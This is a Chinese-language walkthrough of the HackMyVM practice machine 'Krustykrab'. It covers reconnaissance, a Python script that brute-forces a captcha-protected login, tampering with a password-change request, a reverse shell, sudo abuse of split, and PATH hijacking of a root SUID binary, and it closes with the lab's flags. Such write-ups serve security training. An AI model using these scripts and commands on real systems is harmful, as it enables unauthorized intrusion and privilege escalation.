![image-20251107225423874](http://7r1UMPHK.github.io/image/20251108161019253.webp)

>**靶机地址**: https://hackmyvm.eu/machines/machine.php?vm=Krustykrab
>
>**难度**：中等
>
>**作者**：hyh

## 一、信息收集

### 1.1 主机发现

使用 `arp-scan` 对目标网段进行扫描，以发现存活主机。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
...
192.168.205.135 08:00:27:e5:75:2d       PCS Systemtechnik GmbH
...
```

根据扫描结果，确定目标主机的 IP 地址为 `192.168.205.135`。

### 1.2 端口扫描

使用 Nmap 对目标主机进行全端口扫描，以确定开放的服务。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.135
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-07 20:51 CST
Nmap scan report for 192.168.205.135
Host is up (0.00025s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E5:75:2D (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

扫描发现目标开放了两个端口：

*   **22/tcp**: SSH 服务
*   **80/tcp**: HTTP 服务

## 二、服务枚举与漏洞发现

### 2.1 HTTP 服务枚举

访问 80 端口，发现网站根目录显示了 Apache 的默认页面，但页面内容提示网站真实路径位于 `/var/www/html/finexo`。

访问 `http://192.168.205.135/finexo/`，发现一个加密货币交易网站，包含一个登录页面。

使用 `gobuster` 对网站目录进行爆破，寻找可利用的路径或文件。

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.135/finexo/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak,js -t 64
...
/index.html           (Status: 200)
/login.php            (Status: 200)
/uploads              (Status: 301)
/logout.php           (Status: 302)
/config.php           (Status: 200) [Size: 0]
/dashboard            (Status: 301)
...
```

### 2.2 登录认证绕过

登录页面存在验证码机制。通过分析页面源码和网络请求，发现验证码是通过访问 `http://192.168.205.135/finexo/login.php?action=generateCaptcha` 接口获取的。这意味着我们可以在每次登录尝试前获取一个有效的验证码。

通过尝试不同的用户名，根据服务器返回的错误信息（“Wrong Password” vs “Wrong Username”），确定存在一个有效用户名为 `SpongeBob`。

结合以上发现，编写 Python 脚本，使用字典对 `SpongeBob` 用户的密码进行爆破。

```python
import requests

s=requests.session()
with open('../rockyou.txt','r',encoding='latin-1')as f:
    for pwd in f:
        pwd=pwd.strip()
        code=s.get('http://192.168.205.135/finexo/login.php?action=generateCaptcha').text
        r=s.post('http://192.168.205.135/finexo/login.php',{'username':'SpongeBob','password':pwd,'captcha':code})
        if 'Wrong' not in r.text:
            print(f'[+] {pwd}')
            break
        print(f'[-] {pwd}')
```

脚本成功跑出密码为 `squarepants`。

## 三、漏洞利用

### 3.1 越权密码修改

![image-20251107212503062](http://7r1UMPHK.github.io/image/20251108161017716.webp)

使用 `SpongeBob:squarepants` 成功登录后台。后台功能有限，文件上传功能会将上传的文件重命名为 `.jpg` 后缀，无法直接利用。

![image-20251107213101438](http://7r1UMPHK.github.io/image/20251108161019613.webp)

发现一个修改密码的功能。使用 Burp Suite 抓取修改密码的请求，发现请求中包含了 `username` 参数。

```http
POST /finexo/admin_dashboard/profile.php HTTP/1.1
...
Content-Type: multipart/form-data; boundary=----geckoformboundaryfed4b4c36c59a662781127189307f88

------geckoformboundaryfed4b4c36c59a662781127189307f88
Content-Disposition: form-data; name="password"

123456
------geckoformboundaryfed4b4c36c59a662781127189307f88
Content-Disposition: form-data; name="username"

SpongeBob
------geckoformboundaryfed4b4c36c59a662781127189307f88--
```

尝试将 `username` 参数修改为 `Administratro`，并设置一个新密码 `123456`。请求成功，表明存在越权漏洞，成功修改了 `Administratro` 用户的密码。

### 3.2 获取 Shell

使用 `Administratro:123456` 登录，进入了更高权限的管理后台。该后台存在一个功能可以直接执行系统命令。

在本地使用 `netcat` 开启监听：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888
```

在 Web 后台的命令执行功能中，提交反弹 shell 的 payload，成功获取 `www-data` 用户的 shell。

```bash
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.135] 38918
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!Tip]稳定shell
>
> script /dev/null -c bash
> Ctrl+Z
> stty raw -echo; fg
> reset xterm
> export TERM=xterm
> export SHELL=/bin/bash
> stty rows 36 columns 178
>
> ↑这个要自己算
>
> stty -a|grep 'row'|awk -F'[ ;]+' '{print "stty "$4,$5,$6,$7}'

## 四、权限提升

### 4.1 www-data -> KrustyKrab

在获取的 shell 中，检查当前用户的 `sudo` 权限。

```bash
www-data@KrustyKrab:/var/www/html/finexo/admin_dashborad$ sudo -l
...
User www-data may run the following commands on KrustyKrab:
    (KrustyKrab) NOPASSWD: /usr/bin/split
```

发现 `www-data` 用户可以免密以 `KrustyKrab` 用户的身份执行 `/usr/bin/split` 命令。查询 GTFOBins 可知，`split` 命令可用于提权。

```bash
www-data@KrustyKrab:/tmp$ sudo -u KrustyKrab split --filter=/bin/sh /dev/stdin
id
uid=1000(KrustyKrab) gid=1000(debian) groups=1000(debian), ...
```

通过该命令成功切换到 `KrustyKrab` 用户。

### 4.2 KrustyKrab -> spongebob

继续检查 `KrustyKrab` 用户的 `sudo` 权限。

```bash
KrustyKrab@KrustyKrab:~$ sudo -l
...
User KrustyKrab may run the following commands on KrustyKrab:
    (spongebob) NOPASSWD: /usr/bin/ttteeesssttt
```

发现可以免密以 `spongebob` 的身份运行 `/usr/bin/ttteeesssttt`。运行该程序，发现是一个制作蟹黄堡的小游戏，需要按照正确的顺序排列食材。

在 `KrustyKrab` 的家目录下发现一个名为 `help` 的文件，该文件包含了正确的蟹黄堡配方gif：`面包、肉饼、生菜、奶酪、洋葱、西红柿、番茄酱、芥末、腌椰菜、面包`。

根据程序给出的**打乱**的食材列表和 `help` 文件中的正确顺序，输入正确的字母序列，成功通过挑战，获得 `spongebob` 用户的 shell。

```bash
KrustyKrab@KrustyKrab:~$ sudo -u spongebob /usr/bin/ttteeesssttt
...
Please enter the correct order using letters (e.g., ABCDEFGHIJ): HJEIGCDABF

Validation successful! Perfect Krabby Patty!
spongebob@KrustyKrab:/home/KrustyKrab$ id
uid=1001(spongebob) gid=1001(spongebob) groups=1001(spongebob),...
```

### 4.3 spongebob -> Squidward

在 `spongebob` 的家目录下，发现 `key1`、`key2.jpeg` 和 `note.txt` 三个文件。`note.txt` 提示 `Squidward` 用户的密码是 `md5($key1$key2)`。

根据提示，密码的生成逻辑是：将 `key1` 文件的内容和 `key2.jpeg` 文件的 MD5 值拼接起来，然后对拼接后的字符串再进行一次 MD5 计算。

1. 读取 `key1`：`cat key1` -> `e1964798cfe86e914af895f8d0291812`

2. 计算 `key2.jpeg` 的 MD5：`md5sum key2.jpeg` -> `5e1d0c1a168dc2d70004c2b00ba314ae`

3. 拼接并计算最终 MD5：

   ```bash
   spongebob@KrustyKrab:~$ echo -n "e1964798cfe86e914af895f8d02918125e1d0c1a168dc2d70004c2b00ba314ae" | md5sum
   7ac254848d6e4556b73398dde2e4ef82  -
   ```

   使用计算出的密码 `7ac254848d6e4556b73398dde2e4ef82` 成功切换到 `Squidward` 用户。

```bash
spongebob@KrustyKrab:~$ su Squidward
Password: 7ac254848d6e4556b73398dde2e4ef82
$ id
uid=1002(Squidward) gid=1003(Squidward) groups=1003(Squidward)
```

### 4.4 Squidward -> root

在 `Squidward` 的家目录下，发现一个由 root 用户拥有且设置了 SUID 位的可执行文件 `laststep`。

```bash
Squidward@KrustyKrab:~$ ls -al
...
-rwsr-xr-x 1 root      root      16056 Mar 27  2025 laststep
```

直接运行该文件，它会输出 `/etc/shadow` 的内容。使用 `strings` 命令分析该文件，发现它内部通过 `system("cat /etc/shadow")` 来实现此功能。

由于程序以 root 权限执行 `cat` 命令，并且没有使用绝对路径，这里存在明显的 PATH 环境变量劫持漏洞。

1. 在当前目录下创建一个名为 `cat` 的恶意脚本，内容为给 `/bin/bash` 添加 SUID 权限。

   ```bash
   Squidward@KrustyKrab:~$ echo 'chmod +s /bin/bash' > cat
   ```

2. 给该脚本添加执行权限。

   ```bash
   Squidward@KrustyKrab:~$ chmod +x cat
   ```

3. 将当前目录 `.` 添加到 PATH 环境变量的最前面。

   ```bash
   Squidward@KrustyKrab:~$ export PATH=.:$PATH
   ```

4. 再次运行 `laststep`。此时，它会以 root 权限执行我们编写的恶意 `cat` 脚本。

   ```bash
   Squidward@KrustyKrab:~$ ./laststep
   ```

5. 检查 `/bin/bash` 的权限，发现已成功设置 SUID 位。

   ```bash
   Squidward@KrustyKrab:~$ ls -al /bin/bash
   -rwsr-sr-x 1 root root 1265648 Apr 23  2023 /bin/bash
   ```

6. 执行 `bash -p` 以保留 euid，获得 root 权限的 shell。

   ```bash
   Squidward@KrustyKrab:~$ bash -p
   bash-5.2# id
   uid=1002(Squidward) gid=1003(Squidward) euid=0(root) egid=0(root) groups=0(root),1003(Squidward)
   ```

最后，读取 user 和 root 的 flag。

```bash
bash-5.2# /bin/cat /home/KrustyKrab/user.txt
dcc8b0c111c9fa1522c7abfac8d1864b
bash-5.2# /bin/cat /root/root.txt
efe397e3897f0c19ef0150c2b69046a3
```

成功获取 root 权限，渗透测试完成。